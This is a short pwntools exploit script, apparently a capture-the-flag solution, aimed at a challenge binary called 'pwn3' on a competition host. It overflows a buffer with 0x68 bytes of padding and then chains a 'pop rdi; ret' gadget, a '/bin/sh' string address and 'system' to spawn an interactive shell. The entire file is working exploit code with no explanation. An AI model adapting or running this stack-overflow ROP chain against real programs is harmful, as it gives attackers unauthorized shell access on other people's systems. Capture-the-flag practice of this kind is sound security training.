from pwn import *


binary = "src/pwn3"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break vuln
continue
"""

if args.REMOTE:
    p = remote("pwn3.chal.cyberjousting.com", 1337)
elif args.REMOTE2:
    p = remote("localhost", 40000)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


### EXPLOIT ###
payload = flat(
    b'A' * 0x68,
    p64(0x4011a3),      # pop rdi; ret
    p64(0x404028),      # /bin/sh
    p64(0x401197),      # system
)
p.sendline(payload)
p.interactive()